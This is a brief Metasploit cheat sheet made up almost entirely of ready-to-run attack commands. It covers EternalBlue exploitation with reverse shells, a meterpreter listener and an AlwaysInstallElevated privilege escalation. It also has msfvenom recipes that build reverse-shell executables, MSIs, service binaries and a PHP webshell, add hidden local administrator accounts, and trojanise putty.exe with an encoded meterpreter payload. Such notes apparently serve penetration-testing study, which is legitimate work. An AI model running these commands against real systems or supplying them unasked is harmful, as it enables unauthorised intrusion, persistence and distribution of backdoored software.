# Metasploit  

// Metasploit commands
 
     msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;setg RHOSTS $IP;setg LHOST tun0;run"  
     msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/x64/shell/reverse_tcp;setg RHOSTS $IP;setg LHOST tun0;run"  
     msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST x.x.x.x;set LPORT 4445;run"
     msfconsole -q -x "use exploit/windows/local/always_install_elevated;set lhost x.x.x.x;set session 1;run
     sessions -u 1  
     sessions -i 5  
     background  
     search shell_to_meterpreter  
     search php/meterpreter/reverse_tcp  


// Payloads with msfvenom
```
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin  
msfvenom -p php/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw -o evil.php
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -o payload.exe  
msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f msi -o rev-shell.msi
msfvenom -p windows/exec CMD='net user <username> <password> /add && net localgroup administrators bilbo /add' -f exe -o adduser.exe
msfvenom -p windows/exec CMD='powershell -Command "net user <username> <password> /add; net localgroup administrators <username> /add"' -f exe -o adduser.exe
msfvenom -p windows/exec CMD='net localgroup administrators <username> /add' -f msi -o adduser.msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe-service -o evil-service.exe
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/meterpreter/reverse_tcp lhost=x.x.x.x lport=4444 -i 3 -b "\x00" -f exe -o puttyX.exe
msfvenom -l encoders
```
